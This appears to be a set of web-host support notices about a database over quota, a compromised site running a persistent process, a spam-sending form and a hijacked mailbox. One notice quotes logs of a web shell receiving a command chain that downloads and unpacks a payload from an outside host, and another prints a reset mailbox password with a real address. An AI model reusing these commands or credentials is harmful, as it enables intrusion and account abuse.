@@ -1,0 +1,89 @@
+    Summary: Database Size Warning (web204-a1sd8bh)
+
+  
+    Dear Customer,
+
+    We are contacting you with regard to a database on your account called (web204-a1sd8bh) attached to
+    the hosting package (allstarsstaff.co.uk). Your database is currently 12775.9MB in size,
+    which exceeds the permitted limit of 500MB. We'd like to help you try and reduce the
+    size of your database, bringing it back under our permitted limit. It is quite likely that a single
+    table within your database is causing the problem, and all that will be necessary is to reduce the
+    size of it. This is especially likely if you're running a forum, they can quickly become very large
+    in size if they have been subjected to automated spam. Very large databases do negatively impact
+    server performance, if we do not hear back from you then we may need to disable yours. If the
+    database remains too large and no action is taken after it has been disabled, then the database may
+    be deleted.
+
+    Best Wishes
+    Heart Internet Support
+	
+	
+	 
+---------------
+	 
+	 Summary: Website Scripting Automatically Disabled (permanent process detected)
+
+   
+
+    Hi,
+
+    We have detected that your hosting package (epilepsychat.co.uk) is running a permanent
+    server process. This is a process which runs continuously rather than
+    running only in response to web site hits. This may indicate that your
+    site has been compromised, in which case it may be distributing viruses
+    and/or attacking other sites on our servers.
+
+    Permanent server processes are against our terms, so scripting has been
+    disabled on this package, but FTP remains enabled.
+
+    Please update this ticket once you have resolved this issue, we can then
+    re-enable this website. If you need advice on how to resolve the issue,
+    please ask.
+
+    Details of the process are included below.
+
+    Best Wishes,
+    Heart Internet Support
+
+    8449 epilepsychat.co.uk (291 s) [23/Nov/2013:12:15:10 +0000]
+    "perl" (/usr/bin/perl) /usr/sbin/httpd
+    perl 8449 epilepsychat.co.uk 0r FIFO 0,8 0t0 846202392 pipe
+    perl 8449 epilepsychat.co.uk 1w FIFO 0,8 0t0 846292793 pipe
+    perl 8449 epilepsychat.co.uk 2w FIFO 0,8 0t0 846202394 pipe
+    perl 8449 epilepsychat.co.uk 3u IPv4 846293819 0t0 TCP 79.170.44.155:51675->91.121.161.131:7000 (ESTABLISHED)
+    epilepsychat.co.uk 37.59.45.217 - - [23/Nov/2013:12:11:31 +0000] "GET /component/content/frontpage/images/stories/keepsmiles.php?cmd=lwp-download%20http://img.youtube.distribuidoradecarteras lara.com/yena.tar.gz;wget%20http://img.youtube.distribuidoradecarteraslara.com/yena.tar.gz;curl%20-O%20http://img.youtube .distribuidoradecarteraslara.com/yena.tar.gz;tar%20zxvf%20yena.tar.gz;rm%20-fr%20yena.tar.gz HTTP/1.1" 200 37638 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6"
+    epilepsychat.co.uk 37.59.45.217 - - [23/Nov/2013:12:11:31 +0000] "GET /images/stories/keepsmiles.php?cmd=lwp-download%20http://img.youtube.distribuidoradecarteraslara.com/yena.tar.gz;wget%20 http://img.youtube.distribuidoradecarteraslara.com/yena.tar.gz;curl%20-O%20http://img.youtube.distribuidoradecarteraslara .com/yena.tar.gz;tar%20zxvf%20yena.tar.gz;rm%20-fr%20yena.tar.gz HTTP/1.1" 200 1065 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6"
+	
+	
+---------------
+
+Summary: Package cooperman435.co.uk disabled: Tell-A-Friend Spam
+
+    Hi,
+
+    Thanks for taking the time to read this ticket. This site has been disabled as it was found to be sending out large volumes of spam email. This is apparently due to an exploit in the 'tell-a-friend' functionality of this site. Please remove, disable or secure this functionality, check the site for other exploits, update it to the latest release of the code, and let us know when this has been completed so that we can re-enable the site.
+
+
+    Best Wishes
+    Heart Internet Support
+	
+---------------
+
+Summary:  Mailbox joseluis@carbonellarquitectura.com: Spamming
+
+ 
+    Thanks for taking the time to read this email. We have disabled the following mailbox after it was found to be sending a large quantity of spam emails:-
+
+    joseluis@carbonellarquitectura.com
+
+    The login details for this mailbox have been captured by an external, malicious party. Usually, we find that this is due to malware on a client PC, a compromised website that contained the details, or a weak password. Please virus scan all PCs that have access to this mailbox, review the logs of any websites that use this mailbox, and change the password to something secure. Once this has been completed, let us know and we'll re-activate the mailbox for you.
+
+    The password has been changed as a further security measure - the mailbox's new password is o/m+v05vP/wi
+
+    If this, or any other mailbox in your account, has a weak password, it is liable to be guessed by an attacker, and the account abused for spam. The weakest passwords are common dictionary words (eg 'password', 'test'), or those based on the email address (so, for anonymous@example.com - the passwords anonymous or example would be especially weak). Strong passwords are random strings of digits, numbers and symbols - you can generate strong passwords via the Mail Boxes page in eXtend.
+
+    Best Wishes
+    Heart Internet Support
+	
+---------------
+
